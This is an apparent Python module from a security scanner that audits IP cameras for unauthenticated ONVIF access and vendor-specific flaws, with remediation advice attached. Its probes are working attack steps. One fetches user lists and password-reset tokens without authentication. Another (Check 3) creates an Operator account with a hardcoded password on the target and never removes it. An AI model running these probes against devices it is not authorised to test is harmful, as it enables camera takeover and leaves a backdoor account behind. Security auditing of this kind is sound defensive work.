"""
sin.scanner.onvif_audit
═══════════════════════
Active ONVIF security auditor.
Detects unauthenticated access, user enumeration, and 
Swatak/NT98566-specific vulnerabilities from pentest reports.
"""
import ssl
import urllib.request
import urllib.error
from typing import Dict, List, Optional
from sin.utils.logger import get_logger

logger = get_logger("sin.scanner.onvif_audit")

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE

_REMEDIATION_ONVIF_AUTH = [
    "Enable ONVIF authentication in camera settings.",
    "Use WS-Security UsernameToken for all ONVIF calls.",
    "Segment camera network — block ONVIF port from untrusted VLANs.",
]

_REMEDIATION_SWATAK = [
    "Require authentication for /digest/Upgrade/Discovery endpoint.",
    "Apply firmware update from Securus/vendor addressing SWATAK-2026-001.",
    "Add rate limiting to password reset endpoint.",
]


def _soap_post(url: str, body: str, timeout: int = 5) -> Optional[str]:
    try:
        req = urllib.request.Request(
            url,
            data=body.encode("utf-8"),
            headers={"Content-Type": "text/xml; charset=utf-8",
                     "User-Agent": "SIN-Auditor/1.0"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as e:
        if e.code == 401:
            return "401"
        return None
    except Exception:
        return None


def _https_get(url: str, timeout: int = 5) -> Optional[str]:
    try:
        req = urllib.request.Request(
            url, headers={"User-Agent": "SIN-Auditor/1.0"}
        )
        with urllib.request.urlopen(req, timeout=timeout, context=_SSL_CTX) as r:
            return r.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as e:
        return None
    except Exception:
        return None


_GET_DEVICE_INFO = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body>
</s:Envelope>"""

_GET_USERS = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body><GetUsers xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body>
</s:Envelope>"""

_CREATE_USER = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body>
    <CreateUsers xmlns="http://www.onvif.org/ver10/device/wsdl">
      <User>
        <Username>sin-probe-test</Username>
        <Password>SINprobe@2024!</Password>
        <UserLevel>Operator</UserLevel>
      </User>
    </CreateUsers>
  </s:Body>
</s:Envelope>"""


class ONVIFAuditor:

    def audit(self, ip: str, open_ports: List[int]) -> List[Dict]:
        findings = []
        ports = set(open_ports)

        # ── ONVIF checks (port 80 or 8080) ───────────────────────────────────
        onvif_port = 80 if 80 in ports else (8080 if 8080 in ports else None)
        if onvif_port:
            url = f"http://{ip}:{onvif_port}/onvif/device_service"

            # Check 1 — GetDeviceInformation without auth
            resp = _soap_post(url, _GET_DEVICE_INFO)
            if resp and resp != "401" and "Manufacturer" in resp or \
               (resp and resp != "401" and "Model" in resp):
                findings.append({
                    "severity": "HIGH",
                    "type": "Unauthenticated ONVIF Device Info",
                    "cve": "CWE-306",
                    "description": (
                        f"ONVIF GetDeviceInformation returns device details "
                        f"without any authentication on {ip}:{onvif_port}. "
                        "Attacker can enumerate firmware version, model, and serial."
                    ),
                    "remediation": _REMEDIATION_ONVIF_AUTH,
                })

            # Check 2 — GetUsers without auth
            resp = _soap_post(url, _GET_USERS)
            if resp and resp != "401" and "Username" in resp:
                findings.append({
                    "severity": "CRITICAL",
                    "type": "Unauthenticated ONVIF User Enumeration",
                    "cve": "CWE-306",
                    "description": (
                        f"ONVIF GetUsers returns all user accounts without "
                        f"authentication on {ip}:{onvif_port}. "
                        "Attacker can enumerate all admin accounts."
                    ),
                    "remediation": _REMEDIATION_ONVIF_AUTH,
                })

            # Check 3 — CreateUsers without auth (backdoor creation)
            resp = _soap_post(url, _CREATE_USER)
            if resp and resp != "401" and "Fault" not in resp and resp != "":
                findings.append({
                    "severity": "CRITICAL",
                    "type": "Unauthenticated ONVIF Backdoor Creation",
                    "cve": "CWE-306",
                    "description": (
                        f"ONVIF CreateUsers succeeds without authentication on "
                        f"{ip}:{onvif_port}. Full device takeover achievable "
                        "in under 60 seconds. CVSS 10.0."
                    ),
                    "remediation": _REMEDIATION_ONVIF_AUTH,
                })

        # ── Swatak/NT98566 V8 specific checks (port 443) ─────────────────────
        if 443 in ports:

            # Check 4 — Unauthenticated device discovery endpoint
            resp = _https_get(f"https://{ip}/digest/Upgrade/Discovery")
            if resp and "SwVersion" in resp:
                findings.append({
                    "severity": "MEDIUM",
                    "type": "Unauthenticated Device Discovery Endpoint",
                    "cve": "SWATAK-2026-003",
                    "description": (
                        f"GET /digest/Upgrade/Discovery on {ip} returns firmware "
                        "version, MAC address, serial number, and network config "
                        "without authentication."
                    ),
                    "remediation": _REMEDIATION_SWATAK,
                })

            # Check 5 — Unauthenticated password reset token generation
            resp = _https_get(
                f"https://{ip}/digest/UserAccessMgr/User/RestorePsd"
            )
            if resp and "RestoreString" in resp:
                findings.append({
                    "severity": "HIGH",
                    "type": "Unauthenticated Password Reset Token",
                    "cve": "SWATAK-2026-001",
                    "description": (
                        f"GET /digest/UserAccessMgr/User/RestorePsd on {ip} "
                        "returns a valid password reset token without authentication. "
                        "CVSS 7.5. Can be chained with other vulnerabilities."
                    ),
                    "remediation": _REMEDIATION_SWATAK,
                })

        if findings:
            logger.warning(
                f"ONVIF audit {ip}: {len(findings)} finding(s) — "
                f"{[f['type'] for f in findings]}"
            )

        return findings


onvif_auditor = ONVIFAuditor()
